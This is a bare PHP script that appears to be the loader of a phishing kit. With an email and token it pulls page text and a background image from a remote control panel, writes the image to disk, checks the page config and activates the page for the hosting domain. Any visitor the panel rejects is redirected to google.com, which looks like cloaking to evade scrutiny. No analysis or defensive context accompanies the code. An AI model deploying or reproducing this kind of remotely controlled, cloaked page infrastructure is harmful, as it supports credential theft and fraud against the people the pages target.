<?php
include "auth.php";
// encrypted words
$vv = curl($base_url."site/eny-pages?email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME']);
if($vv=="Invalid" || $vv=="Invalid type" || $vv=="Invalid User"){
    die(header("location:https://google.com"));
}
$data= json_decode($vv);
//background image
$out = curl($base_url."site/back?email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME']);
if($vv=="Invalid" || $vv=="Invalid type" || $vv=="Invalid User"){
    die(header("location:https://google.com"));
}
file_put_contents('images/circle.svg', $out);
// Check Page Config
$con =curl($base_url."page-options/config?email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME']);
if($con=="Invalid"){
    die(header("location:https://google.com"));
}
//page active :
$act =curl($base_url."site/activate?email=".$email."&token=".$token."&type=".$page.'&domain='.$_SERVER['SERVER_NAME']);
if($act=="Invalid"){
    die(header("location:https://google.com"));
}
function curl($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
     return $output;
}
?>




